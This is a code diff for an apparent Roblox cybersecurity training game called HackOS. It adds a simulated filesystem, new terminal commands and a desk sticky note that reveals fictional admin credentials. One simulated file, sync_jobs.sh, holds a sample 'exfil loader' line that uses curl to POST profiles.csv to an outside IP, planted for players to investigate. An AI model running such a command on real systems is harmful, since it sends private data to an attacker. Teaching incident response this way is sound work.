@@ -32,11 +32,12 @@ local MainGUI, HintGUI
 local TermFrame, BrowserFrame, TermOut, TermInput, UrlBox, PageLabel, ClockLabel, MissionsFrame, MissionsList, ObjectivesList
 local chapterExpanded = {}
 local BrowserStatusLabel, BrowserContent, LinkBar
-local AdminLoginPage, AdminDashboardPage, AdminUserBox, AdminPassBox, AdminLoginStatus, AdminSearchBox, AdminResultsFrame
+local AdminLoginPage, AdminDashboardPage, AdminUserBox, AdminPassBox, AdminLoginStatus, AdminSearchBox, AdminResultsFrame, AdminStickyNoteButton, AdminStickyNoteBody
 local PacketPage, PacketToolbar, PacketListFrame, PacketIPBox, PacketDNSBox, PacketApplyBtn, PacketClearBtn, PacketFollowBtn
 local browserState = {
 adminLoggedIn = false,
 currentUrl = "about:blank",
+stickyNoteInspected = false,
 }
 local commandHistory = {}
 local historyIndex = nil
@@ -180,34 +181,70 @@ return table.concat(lines, "\n")
 end
 local SimFileContentsByHost = {
 localhost = {
-["readme.txt"] = "HackOS SIM filesystem.\nEverything here is fictional.",
-["notes.txt"] = "Training flow:\n1) scan nearby networks\n2) inspect packets\n3) connect safely\n4) investigate logs",
-["capture.pcap"] = "PCAP SUMMARY (SIM)\n- weak WiFi observed\n- admin credential-like packet seen\n- outbound beacon flagged",
-["player.txt"] = "Local profile (SIM)\nuser=rbxplayer\nrole=junior analyst",
-["chapter1.txt"] = "Hint:\nStart with nearby recon\nFollow workstation traffic\nThen inspect packets",
-["mail.txt"] = "Inbox preview (SIM)\nOne suspicious message references 'urgent account verification'",
-["system.log"] = "[00:10] boot ok\n[00:11] terminal ready\n[00:12] browser renderer online",
-["network.log"] = "[net] Bloxplay_ITWifi seen\n[net] Bloxplay_AdminWifi seen\n[net] PlayerData_Vault referenced in captured traffic",
-["cache.dat"] = "temporary cache blob (sim)",
+["/readme.txt"] = "HackOS SIM filesystem.\nEverything here is fictional.",
+["/notes.txt"] = "Training flow:\n1) scan nearby networks\n2) inspect packets\n3) connect safely\n4) investigate logs",
+["/capture.pcap"] = "PCAP SUMMARY (SIM)\n- weak WiFi observed\n- admin credential-like packet seen\n- outbound beacon flagged",
+["/home/player.txt"] = "Local profile (SIM)\nuser=rbxplayer\nrole=junior analyst",
+["/home/chapter1.txt"] = "Hint:\nStart with nearby recon\nFollow workstation traffic\nThen inspect packets",
+["/home/mail.txt"] = "Inbox preview (SIM)\nOne suspicious message references 'urgent account verification'",
+["/logs/system.log"] = "[00:10] boot ok\n[00:11] terminal ready\n[00:12] browser renderer online",
+["/logs/network.log"] = "[net] Bloxplay_ITWifi seen\n[net] Bloxplay_AdminWifi seen\n[net] PlayerData_Vault referenced in captured traffic",
+["/tmp/cache.dat"] = "temporary cache blob (sim)",
 },
 ["playerdata_vault"] = {
-["auth.log"] = table.concat({
+["/auth.log"] = table.concat({
 "2026-03-24 08:02:14 sshd[1203]: Failed login for bloxplay-admin from 203.44.18.77",
 "2026-03-24 08:02:27 sshd[1203]: Failed login for bloxplay-admin from 203.44.18.77",
 "2026-03-24 08:04:08 sshd[1322]: Accepted password for bloxplay-admin from 192.168.32.12",
 "2026-03-24 08:12:40 sshd[1941]: Failed login for backup from 203.44.18.77",
 }, "\n"),
-["report.txt"] = "Server report (SIM)\n- outbound traffic spike detected\n- investigate running processes\n- review netstat output",
-["sync_jobs.sh"] = "#!/bin/sh\n# WannaWail (fictional) exfil loader\ncurl -X POST http://203.44.18.77/upload --data-binary @/srv/profiles.csv",
-["admin.txt"] = "admin home note (SIM)\nPassword changed recently after incident drills.",
-["ops.txt"] = "ops note (SIM)\nIf traffic spikes, inspect psrep and netstat first.",
-["passwd"] = "root:x:0:0\nbloxplay-admin:x:1001:1001\nbackup:x:1002:1002",
-["sshd_config"] = "PermitRootLogin no\nPasswordAuthentication yes\nAllowUsers bloxplay-admin backup",
-["firewall.rules"] = "ALLOW 192.168.0.0/16\nDENY 0.0.0.0/0 -> 23/tcp",
-["player_profiles.db"] = "profile store (sim)",
-["profiles.csv"] = buildPlayerProfilesCSV(),
-["sessions.csv"] = "session_id,username,node,status\nS1,ByteCrest109,StreamDispatch_01,active\nS2,NoahStone103,StreamDispatch_01,active",
-["payouts.csv"] = "creator_id,month,credits\nC-100,Mar,1200\nC-101,Mar,980",
+["/report.txt"] = "Server report (SIM)\n- outbound traffic spike detected\n- investigate running processes\n- review netstat output",
+["/sync_jobs.sh"] = "#!/bin/sh\n# WannaWail (fictional) exfil loader\ncurl -X POST http://203.44.18.77/upload --data-binary @/srv/profiles.csv",
+["/home/admin.txt"] = "admin home note (SIM)\nPassword changed recently after incident drills.",
+["/home/ops.txt"] = "ops note (SIM)\nIf traffic spikes, inspect psrep and netstat first.",
+["/etc/passwd"] = "root:x:0:0\nbloxplay-admin:x:1001:1001\nbackup:x:1002:1002",
+["/etc/sshd_config"] = "PermitRootLogin no\nPasswordAuthentication yes\nAllowUsers bloxplay-admin backup",
+["/etc/firewall.rules"] = "ALLOW 192.168.0.0/16\nDENY 0.0.0.0/0 -> 23/tcp",
+["/player_profiles.db"] = "profile store (sim)",
+["/srv/profiles.csv"] = buildPlayerProfilesCSV(),
+["/srv/sessions.csv"] = "session_id,username,node,status\nS1,ByteCrest109,StreamDispatch_01,active\nS2,NoahStone103,StreamDispatch_01,active",
+["/srv/payouts.csv"] = "creator_id,month,credits\nC-100,Mar,1200\nC-101,Mar,980",
+},
+}
+local SimMetadataByHost = {
+localhost = {
+["/"] = { type = "directory", permissions = "drwxr-xr-x", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 07:58", summary = "Local HackOS workspace" },
+["/home"] = { type = "directory", permissions = "drwxr-x---", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 07:56", summary = "Operator notes and local files" },
+["/logs"] = { type = "directory", permissions = "drwxr-xr-x", owner = "system", group = "ops", modified = "2026-03-24 08:12", summary = "Tablet system and network logs" },
+["/tmp"] = { type = "directory", permissions = "drwx------", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 08:01", summary = "Temporary scratch space" },
+["/readme.txt"] = { type = "file", permissions = "-rw-r--r--", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 07:41", summary = "Simulation readme" },
+["/notes.txt"] = { type = "file", permissions = "-rw-r-----", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 07:49", summary = "Mission checklist" },
+["/capture.pcap"] = { type = "file", permissions = "-rw-r-----", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 08:03", summary = "Captured packet summary" },
+["/home/player.txt"] = { type = "file", permissions = "-rw-------", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 07:45", summary = "Local user profile" },
+["/home/chapter1.txt"] = { type = "file", permissions = "-rw-r-----", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 07:46", summary = "Recon hint sheet" },
+["/home/mail.txt"] = { type = "file", permissions = "-rw-r-----", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 07:51", summary = "Message preview for phishing analysis" },
+["/logs/system.log"] = { type = "file", permissions = "-rw-r--r--", owner = "system", group = "ops", modified = "2026-03-24 08:10", summary = "System boot log" },
+["/logs/network.log"] = { type = "file", permissions = "-rw-r--r--", owner = "system", group = "ops", modified = "2026-03-24 08:14", summary = "Network observations" },
+["/tmp/cache.dat"] = { type = "file", permissions = "-rw-------", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 08:00", summary = "Temporary cache blob" },
+},
+["playerdata_vault"] = {
+["/"] = { type = "directory", permissions = "drwxr-x---", owner = "bloxplay-admin", group = "vaultops", modified = "2026-03-24 08:13", summary = "PlayerData_Vault root" },
+["/home"] = { type = "directory", permissions = "drwx------", owner = "bloxplay-admin", group = "vaultops", modified = "2026-03-24 08:05", summary = "Admin home directory" },
+["/var"] = { type = "directory", permissions = "drwxr-xr-x", owner = "root", group = "root", modified = "2026-03-24 07:59", summary = "Runtime and backup data" },
+["/etc"] = { type = "directory", permissions = "drwxr-xr-x", owner = "root", group = "root", modified = "2026-03-24 07:52", summary = "System configuration files" },
+["/srv"] = { type = "directory", permissions = "drwxr-x---", owner = "vaultsvc", group = "vaultops", modified = "2026-03-24 08:12", summary = "Live exported player data" },
+["/auth.log"] = { type = "file", permissions = "-rw-r-----", owner = "root", group = "secops", modified = "2026-03-24 08:12", summary = "Authentication log with source IPs" },
+["/report.txt"] = { type = "file", permissions = "-rw-r-----", owner = "bloxplay-admin", group = "vaultops", modified = "2026-03-24 08:14", summary = "Incident summary report" },
+["/sync_jobs.sh"] = { type = "file", permissions = "-rwxr-x---", owner = "vaultsvc", group = "vaultops", modified = "2026-03-24 08:09", summary = "Suspicious sync script" },
+["/player_profiles.db"] = { type = "file", permissions = "-rw-r-----", owner = "vaultsvc", group = "vaultops", modified = "2026-03-24 07:48", summary = "Profile database placeholder" },
+["/home/admin.txt"] = { type = "file", permissions = "-rw-------", owner = "bloxplay-admin", group = "vaultops", modified = "2026-03-24 08:06", summary = "Admin note" },
+["/home/ops.txt"] = { type = "file", permissions = "-rw-r-----", owner = "vaultsvc", group = "vaultops", modified = "2026-03-24 08:07", summary = "Operations guidance" },
+["/etc/passwd"] = { type = "file", permissions = "-rw-r--r--", owner = "root", group = "root", modified = "2026-03-22 11:20", summary = "Local user database" },
+["/etc/sshd_config"] = { type = "file", permissions = "-rw-r--r--", owner = "root", group = "root", modified = "2026-03-20 09:14", summary = "SSH daemon settings" },
+["/etc/firewall.rules"] = { type = "file", permissions = "-rw-r-----", owner = "root", group = "secops", modified = "2026-03-18 18:32", summary = "Firewall policy snapshot" },
+["/srv/profiles.csv"] = { type = "file", permissions = "-rw-r-----", owner = "vaultsvc", group = "vaultops", modified = "2026-03-24 08:11", summary = "Exported player profiles" },
+["/srv/sessions.csv"] = { type = "file", permissions = "-rw-r-----", owner = "vaultsvc", group = "vaultops", modified = "2026-03-24 08:10", summary = "Active session export" },
+["/srv/payouts.csv"] = { type = "file", permissions = "-rw-r-----", owner = "vaultsvc", group = "finance", modified = "2026-03-24 07:58", summary = "Creator payout ledger" },
 },
 }
 local OpenFiles = {}
@@ -630,11 +667,29 @@ PageLabel.Text = text or ""
 end
 setBrowserStatus(status or "Static page loaded (sim)")
 end
+local function refreshAdminStickyNote()
+if not AdminStickyNoteBody then return end
+if browserState.stickyNoteInspected then
+AdminStickyNoteBody.Text = table.concat({
+"Portal",
+"bloxplay.com/admin",
+"",
+"User",
+"bloxplay-admin",
+"",
+"Pass",
+"blox123",
+}, "\n")
+else
+AdminStickyNoteBody.Text = "Desk Sticky Note\n\nClick to inspect"
+end
+end
 local function showAdminLoginPage(url)
 hideAllBrowserPages()
 if AdminLoginPage then
 AdminLoginPage.Visible = true
 end
+refreshAdminStickyNote()
 setBrowserStatus(("Loaded %s (sim auth required)"):format(url))
 end
 local function showAdminDashboard(url)
@@ -822,86 +877,301 @@ local host = getHostKey()
 return SimFSByHost[host] or SimFSByHost.localhost
 end
 local function getContents()
-local host = getHostKey()
-return SimFileContentsByHost[host] or SimFileContentsByHost.localhost
+    local host = getHostKey()
+    return SimFileContentsByHost[host] or SimFileContentsByHost.localhost
+end
+local function getMetadata()
+    local host = getHostKey()
+    return SimMetadataByHost[host] or SimMetadataByHost.localhost
 end
 local function getProcesses()
-local host = getHostKey()
-return SimProcessesByHost[host] or SimProcessesByHost.localhost
+    local host = getHostKey()
+    return SimProcessesByHost[host] or SimProcessesByHost.localhost
+end
+local function splitPath(path)
+    local parts = {}
+    for part in tostring(path or ""):gmatch("[^/]+") do
+        parts[#parts + 1] = part
+    end
+    return parts
+end
+local function pathJoin(base, name)
+    if base == "/" then
+        return "/" .. tostring(name or "")
+    end
+    return tostring(base or "/") .. "/" .. tostring(name or "")
+end
+local function pathParent(path)
+    local resolved = tostring(path or "/")
+    if resolved == "/" then
+        return nil
+    end
+    local parts = splitPath(resolved)
+    table.remove(parts)
+    if #parts == 0 then
+        return "/"
+    end
+    return "/" .. table.concat(parts, "/")
+end
+local function normalizePath(path)
+    local raw = tostring(path or ""):gsub("^%s+", ""):gsub("%s+$", "")
+    if raw == "" then
+        return terminalState.currentDir
+    end
+    local parts = {}
+    if raw:sub(1, 1) ~= "/" then
+        for _, part in ipairs(splitPath(terminalState.currentDir)) do
+            parts[#parts + 1] = part
+        end
+    end
+    for _, part in ipairs(splitPath(raw)) do
+        if part == "." or part == "" then
+        elseif part == ".." then
+            if #parts > 0 then
+                table.remove(parts)
+            end
+        else
+            parts[#parts + 1] = part
+        end
+    end
+    if #parts == 0 then
+        return "/"
+    end
+    return "/" .. table.concat(parts, "/")
 end
 local function pathLeaf(path)
-local s = tostring(path or ""):gsub("^%s+", ""):gsub("%s+$", "")
-s = s:gsub("^/+", "")
-local parts = {}
-for part in s:gmatch("[^/]+") do
-parts[#parts + 1] = part
+    local resolved = normalizePath(path)
+    if resolved == "/" then
+        return "/"
+    end
+    local parts = splitPath(resolved)
+    return parts[#parts] or resolved
 end
-return parts[#parts] or s
+local function isDirectoryPath(path)
+    return getFS()[normalizePath(path)] ~= nil
+end
+local function isFilePath(path)
+    return getContents()[normalizePath(path)] ~= nil
+end
+local function getEntryMetadata(path)
+    return getMetadata()[normalizePath(path)]
+end
+local function getEntrySize(path)
+    local resolved = normalizePath(path)
+    if isDirectoryPath(resolved) then
+        local entries = getFS()[resolved] or {}
+        return ("%d item(s)"):format(#entries)
+    end
+    local content = getContents()[resolved]
+    if content == nil then
+        return "unknown"
+    end
+    return ("%d B"):format(#tostring(content))
+end
+local function formatListingLine(path)
+    local resolved = normalizePath(path)
+    local meta = getEntryMetadata(resolved)
+    local name = pathLeaf(resolved)
+    if meta and meta.type == "directory" and name ~= "/" then
+        name = name .. "/"
+    end
+    if not meta then
+        return " " .. name
+    end
+    return ("%s %-14s %-10s %-10s %s"):format(
+        meta.permissions or "----------",
+        meta.owner or "unknown",
+        meta.group or "unknown",
+        getEntrySize(resolved),
+        name
+    )
 end
 local function listPath(path)
-local p = tostring(path or "")
-if p == "" then p = terminalState.currentDir end
-local fs = getFS()
-local list = fs[p]
-if not list then
-addLine(("ls: cannot access '%s': No such file or directory (sim)"):format(p))
-return
-end
-addLine(("Listing %s on %s (sim)"):format(p, terminalState.currentHost))
-for _, name in ipairs(list) do
-addLine(" " .. name)
-end
+    local target = ""
+    local longFormat = false
+    for token in tostring(path or ""):gmatch("%S+") do
+        if token == "-l" or token == "--long" then
+            longFormat = true
+        else
+            target = token
+        end
+    end
+    local p = normalizePath(target)
+    local fs = getFS()
+    if isFilePath(p) then
+        addLine(formatListingLine(p))
+        return
+    end
+    local list = fs[p]
+    if not list then
+        addLine(("ls: cannot access '%s': No such file or directory (sim)"):format(p))
+        return
+    end
+    addLine(("Listing %s on %s (sim)"):format(p, terminalState.currentHost))
+    for _, name in ipairs(list) do
+        local childPath = pathJoin(p, name)
+        if longFormat then
+            addLine(formatListingLine(childPath))
+        else
+            local meta = getEntryMetadata(childPath)
+            local suffix = meta and meta.type == "directory" and "/" or ""
+            addLine(" " .. name .. suffix)
+        end
+    end
 end
 local function catFile(path)
-local name = pathLeaf(path)
-local contents = getContents()
-local content = contents[name]
-if not content then
-addLine(("cat: %s: No such file (sim)"):format(tostring(path)))
-return
-end
-addLine(("--- %s ---"):format(name))
-for line in tostring(content):gmatch("[^\n]+") do
-addLine(line)
-end
+    local resolved = normalizePath(path)
+    local name = pathLeaf(resolved)
+    local contents = getContents()
+    local content = contents[resolved]
+    if not content then
+        if isDirectoryPath(resolved) then
+            addLine(("cat: %s: Is a directory (sim)"):format(resolved))
+        else
+            addLine(("cat: %s: No such file (sim)"):format(tostring(path)))
+        end
+        return
+    end
+    addLine(("--- %s ---"):format(name))
+    for line in tostring(content):gmatch("[^\n]+") do
+        addLine(line)
+    end
 end
 local function openFile(path)
-local name = pathLeaf(path)
-local contents = getContents()
-if not contents[name] then
-addLine(("openfile: %s not found (sim)"):format(tostring(path)))
-return
-end
-OpenFiles[name] = true
-addLine(("Opened %s (sim)"):format(name))
+    local resolved = normalizePath(path)
+    local name = pathLeaf(resolved)
+    local contents = getContents()
+    if not contents[resolved] then
+        addLine(("openfile: %s not found (sim)"):format(tostring(path)))
+        return
+    end
+    OpenFiles[resolved] = true
+    addLine(("Opened %s (sim)"):format(name))
 end
 local function closeFile(path)
-local name = pathLeaf(path)
-if OpenFiles[name] then
-OpenFiles[name] = nil
-addLine(("Closed %s (sim)"):format(name))
-else
-addLine(("closefile: %s is not open (sim)"):format(name))
-end
+    local resolved = normalizePath(path)
+    local name = pathLeaf(resolved)
+    if OpenFiles[resolved] then
+        OpenFiles[resolved] = nil
+        addLine(("Closed %s (sim)"):format(name))
+    else
+        addLine(("closefile: %s is not open (sim)"):format(name))
+    end
 end
 local function removeFile(path)
-local name = pathLeaf(path)
-local contents = getContents()
-local fs = getFS()
-if contents[name] then
-contents[name] = nil
-OpenFiles[name] = nil
-for _, items in pairs(fs) do
-for i = #items, 1, -1 do
-if items[i] == name then
-table.remove(items, i)
+    local resolved = normalizePath(path)
+    local name = pathLeaf(resolved)
+    local contents = getContents()
+    local fs = getFS()
+    local metadata = getMetadata()
+    if contents[resolved] then
+        contents[resolved] = nil
+        metadata[resolved] = nil
+        OpenFiles[resolved] = nil
+        local parent = pathParent(resolved)
+        local items = parent and fs[parent]
+        if items then
+            for i = #items, 1, -1 do
+                if items[i] == name then
+                    table.remove(items, i)
+                end
+            end
+        end
+        addLine(("Removed %s (sim)"):format(name))
+    else
+        addLine(("rm: cannot remove '%s': No such file (sim)"):format(tostring(path)))
+    end
 end
+local function changeDirectory(path)
+    local target = tostring(path or "")
+    if target:gsub("%s", "") == "" then
+        terminalState.currentDir = "/"
+        addLine("Current directory reset to /")
+        return
+    end
+    local resolved = normalizePath(target)
+    if not isDirectoryPath(resolved) then
+        if isFilePath(resolved) then
+            addLine(("cd: %s: Not a directory (sim)"):format(resolved))
+        else
+            addLine(("cd: %s: No such directory (sim)"):format(resolved))
+        end
+        return
+    end
+    terminalState.currentDir = resolved
+    addLine(("Current directory: %s"):format(terminalState.currentDir))
 end
+local function showWorkingDirectory()
+    addLine(("%s:%s"):format(terminalState.currentHost, terminalState.currentDir))
 end
-addLine(("Removed %s (sim)"):format(name))
-else
-addLine(("rm: cannot remove '%s': No such file (sim)"):format(tostring(path)))
+local function showStat(path)
+    local target = tostring(path or "")
+    if target:gsub("%s", "") == "" then
+        addLine("Try: stat <path>")
+        return
+    end
+    local resolved = normalizePath(target)
+    local meta = getEntryMetadata(resolved)
+    if not meta then
+        addLine(("stat: %s: No such file or directory (sim)"):format(resolved))
+        return
+    end
+    addLine(("File: %s"):format(resolved))
+    addLine(("Type: %s"):format(meta.type or "unknown"))
+    addLine(("Size: %s"):format(getEntrySize(resolved)))
+    addLine(("Owner: %s:%s"):format(meta.owner or "unknown", meta.group or "unknown"))
+    addLine(("Access: %s"):format(meta.permissions or "----------"))
+    addLine(("Modified: %s"):format(meta.modified or "unknown"))
+    if meta.summary then
+        addLine(("Summary: %s"):format(meta.summary))
+    end
 end
+local function findEntries(rawInput)
+    local trimmed = tostring(rawInput or ""):gsub("^%s+", ""):gsub("%s+$", "")
+    if trimmed == "" then
+        addLine("Try: find <path> <name>")
+        return
+    end
+    local tokens = {}
+    for token in trimmed:gmatch("%S+") do
+        tokens[#tokens + 1] = token
+    end
+    local rootPath, query
+    if #tokens == 1 then
+        rootPath = terminalState.currentDir
+        query = tokens[1]
+    else
+        rootPath = tokens[1]
+        query = table.concat(tokens, " ", 2)
+    end
+    local resolvedRoot = normalizePath(rootPath)
+    if not isDirectoryPath(resolvedRoot) then
+        addLine(("find: %s: No such directory (sim)"):format(resolvedRoot))
+        return
+    end
+    local fs = getFS()
+    local matches = {}
+    local needle = query:lower()
+    local function scanDir(dirPath)
+        for _, name in ipairs(fs[dirPath] or {}) do
+            local childPath = pathJoin(dirPath, name)
+            if childPath:lower():find(needle, 1, true) or name:lower():find(needle, 1, true) then
+                matches[#matches + 1] = childPath
+            end
+            if fs[childPath] then
+                scanDir(childPath)
+            end
+        end
+    end
+    scanDir(resolvedRoot)
+    if #matches == 0 then
+        addLine(("No matches for '%s' under %s (sim)"):format(query, resolvedRoot))
+        return
+    end
+    addLine(("Matches for '%s' under %s (sim)"):format(query, resolvedRoot))
+    for _, match in ipairs(matches) do
+        addLine(" " .. match)
+    end
 end
 local function showScan(target)
 target = target ~= "" and target:lower() or "nearby"
@@ -1077,7 +1347,8 @@ addLine('Try: grep "Failed login" auth.log')
 return
 end
 local contents = getContents()
-local text = contents[pathLeaf(file)]
+local resolved = normalizePath(file)
+local text = contents[resolved]
 if not text then
 addLine(("grep: %s: No such file (sim)"):format(file))
 return
@@ -1193,17 +1464,21 @@ addLine("mac <ip> - show MAC for device")
 addLine("connect <ip> - simulate network access (sim)")
 addLine("ssh <user@ip> - simulate SSH login")
 addLine("exit - leave simulated SSH session")
-addLine("netstat - show fake network sessions")
-addLine("psrep - list simulated processes")
-addLine('grep "<term>" <file> - search inside simulated logs')
-addLine("malwarescan - simulate malware scan")
-addLine("kill <pid> - terminate simulated process")
-addLine("ls [path] - list simulated files")
+addLine("pwd - show current simulated working directory")
+addLine("cd <path> - move through simulated folders")
+addLine("ls [-l] [path] - list folders and files")
+addLine("stat <path> - inspect simulated file metadata")
+addLine("find <path> <name> - search the simulated filesystem")
 addLine("cat <file> - read simulated file")
+addLine('grep "<term>" <file> - search inside simulated logs')
 addLine("openfile <file> - open simulated file")
 addLine("closefile <file> - close simulated file")
-addLine("echo <text> - print text")
 addLine("rm <file> - remove simulated file")
+addLine("netstat - show fake network sessions")
+addLine("psrep - list simulated processes")
+addLine("malwarescan - simulate malware scan")
+addLine("kill <pid> - terminate simulated process")
+addLine("echo <text> - print text")
 addLine("passwd <text> - password set/check (sim)")
 addLine("baitcheck <text> - detect phishing clues (sim)")
 addLine("decoymail <text> - inspect suspicious email tone (sim)")
@@ -1221,7 +1496,7 @@ mk("UIListLayout", { Parent = TermOut, Name = "UIListLayout", Padding = UDim.new
 addLine(PROMPT)
 end
 if TermInput then TermInput.Text = "" end
-browserState = { adminLoggedIn = false, currentUrl = "about:blank" }
+browserState = { adminLoggedIn = false, currentUrl = "about:blank", stickyNoteInspected = false }
 terminalState = {
 currentHost = "local",
 currentDir = "/",
@@ -1247,20 +1522,57 @@ return nil
 end
 return remotes:FindFirstChild(name)
 end
-local function syncScenarioProgress(raw)
+local function syncScenarioProgress(raw, options)
+options = options or {}
 local checkSolutionRemote = getScenarioRemote("CheckSolution")
 if not checkSolutionRemote then
-return
+return nil
 end
 local ok, result = pcall(function()
 return checkSolutionRemote:InvokeServer(raw)
 end)
 if not ok or type(result) ~= "table" then
-return
+return nil
 end
-if result.success and (result.stepComplete or result.chapterComplete) and type(result.feedback) == "string" and result.feedback ~= "" then
+if not options.silent and result.success and (result.stepComplete or result.chapterComplete) and type(result.feedback) == "string" and result.feedback ~= "" then
 addLine(result.feedback)
 end
+return result
+end
+local function getScenarioSessionInfo()
+local getSessionInfoRemote = getScenarioRemote("GetSessionInfo")
+if not getSessionInfoRemote then
+return nil
+end
+local ok, sessionInfo = pcall(function()
+return getSessionInfoRemote:InvokeServer()
+end)
+if ok and type(sessionInfo) == "table" then
+return sessionInfo
+end
+return nil
+end
+local function scenarioStepMatches(stepIds)
+if type(stepIds) ~= "table" or #stepIds == 0 then
+return true
+end
+local sessionInfo = getScenarioSessionInfo()
+local currentStepId = sessionInfo and sessionInfo.stepId
+if type(currentStepId) ~= "string" or currentStepId == "" then
+return false
+end
+for _, stepId in ipairs(stepIds) do
+if currentStepId == stepId then
+return true
+end
+end
+return false
+end
+local function submitScenarioAction(raw, stepIds)
+if not scenarioStepMatches(stepIds) then
+return nil
+end
+return syncScenarioProgress(raw, { silent = true })
 end
 local function showScenarioHint()
 local getHintRemote = getScenarioRemote("GetHint")
@@ -1299,8 +1611,16 @@ end
 local function parseQuotedAndFile(input)
 local pat, file = input:match('^%s*"(.-)"%s+(.+)$')
 if pat and file then return pat, file end
-local a, b = input:match("^(%S+)%s+(.+)$")
-return a, b
+local tokens = {}
+for token in tostring(input or ""):gmatch("%S+") do
+ tokens[#tokens + 1] = token
+end
+if #tokens < 2 then
+ return nil, nil
+end
+local lastToken = tokens[#tokens]
+tokens[#tokens] = nil
+return table.concat(tokens, " "), lastToken
 end
 if cmd == "help" then
 showHelp()
@@ -1357,6 +1677,10 @@ elseif cmd == "exit" then
 fakeExit()
 elseif cmd == "netstat" then
 fakeNetstat()
+elseif cmd == "pwd" then
+showWorkingDirectory()
+elseif cmd == "cd" then
+changeDirectory(rest(2))
 elseif cmd == "psrep" or (cmd == "ps" and (args[2] or "") == "aux") then
 fakePsrep()
 elseif cmd == "grep" then
@@ -1367,7 +1691,11 @@ fakeMalwareScan()
 elseif cmd == "kill" then
 fakeKill(args[2] or "")
 elseif cmd == "ls" then
-listPath(args[2] or "")
+listPath(rest(2))
+elseif cmd == "stat" then
+showStat(rest(2))
+elseif cmd == "find" then
+findEntries(rest(2))
 elseif cmd == "cat" then
 catFile(rest(2))
 elseif cmd == "openfile" then
@@ -1835,6 +2163,47 @@ TextColor3 = Color3.fromRGB(90, 100, 118),
 Size = UDim2.new(1, -30, 0, 20),
 Position = UDim2.new(0, 15, 0, 233),
 })
+AdminStickyNoteButton = mk("TextButton", {
+Parent = AdminLoginPage,
+Text = "",
+AutoButtonColor = true,
+BackgroundColor3 = Color3.fromRGB(255, 235, 145),
+BorderSizePixel = 0,
+Position = UDim2.new(1, -166, 0, 86),
+Size = UDim2.new(0, 146, 0, 138),
+})
+round(AdminStickyNoteButton, 12)
+mk("UIStroke", {
+Parent = AdminStickyNoteButton,
+Color = Color3.fromRGB(209, 181, 91),
+Thickness = 1,
+})
+mk("TextLabel", {
+Parent = AdminStickyNoteButton,
+BackgroundTransparency = 1,
+Text = "STICKY NOTE",
+Font = Enum.Font.GothamBold,
+TextSize = 14,
+TextColor3 = Color3.fromRGB(105, 78, 19),
+TextXAlignment = Enum.TextXAlignment.Left,
+Position = UDim2.new(0, 12, 0, 8),
+Size = UDim2.new(1, -24, 0, 18),
+})
+AdminStickyNoteBody = mk("TextLabel", {
+Parent = AdminStickyNoteButton,
+BackgroundTransparency = 1,
+Text = [[Desk Sticky Note
+
+Click to inspect]],
+TextWrapped = true,
+TextXAlignment = Enum.TextXAlignment.Left,
+TextYAlignment = Enum.TextYAlignment.Top,
+Font = Enum.Font.Gotham,
+TextSize = 13,
+TextColor3 = Color3.fromRGB(76, 61, 23),
+Position = UDim2.new(0, 12, 0, 30),
+Size = UDim2.new(1, -24, 1, -40),
+})
 AdminDashboardPage = mk("Frame", {
 Parent = BrowserContent,
 BackgroundTransparency = 1,
@@ -2009,16 +2378,44 @@ AdminPassBox.Text = ""
 AdminPassBox:SetAttribute("RealPassword", "")
 end
 end
+local function inspectAdminStickyNote()
+browserState.stickyNoteInspected = true
+refreshAdminStickyNote()
+if AdminUserBox then
+AdminUserBox.Text = "bloxplay-admin"
+end
+if AdminPassBox then
+AdminPassBox:SetAttribute("RealPassword", "blox123")
+adminPassMasking = true
+AdminPassBox.Text = string.rep("*", #tostring(AdminPassBox:GetAttribute("RealPassword") or ""))
+AdminPassBox.CursorPosition = #AdminPassBox.Text + 1
+adminPassMasking = false
+end
+local result = submitScenarioAction("browser_sticky_note inspect", { "ch2_note" })
+if result and result.success then
+setBrowserStatus("Sticky note inspected. Vault credentials recovered.")
+else
+setBrowserStatus("Sticky note inspected. Admin portal credentials exposed on the desk note.")
+end
+end
 adminLoginBtn.MouseButton1Click:Connect(tryAdminLogin)
+if AdminStickyNoteButton then
+AdminStickyNoteButton.MouseButton1Click:Connect(inspectAdminStickyNote)
+end
 AdminSearchBox:GetPropertyChangedSignal("Text"):Connect(function()
 renderAdminResults(AdminSearchBox.Text)
 end)
 PacketApplyBtn.MouseButton1Click:Connect(function()
-local ip = PacketIPBox.Text
+local ip = tostring(PacketIPBox.Text or ""):gsub("^%s+", ""):gsub("%s+$", "")
+local result = submitScenarioAction(("browser_capture %s"):format(ip ~= "" and ip or "unknown"), { "ch1_packets" })
 if startPacketCaptureForIP(ip) then
 populatePacketRows()
 local host = getHostByIP(ip)
+if result and result.success then
+setBrowserStatus(("Capture verified for %s [%s]. Mission step complete."):format(host.label, host.ip))
+else
 setBrowserStatus(("Capturing packets for %s [%s] (sim)"):format(host.label, host.ip))
+end
 else
 populatePacketRows()
 setBrowserStatus("Unknown IP. No simulated capture available.")
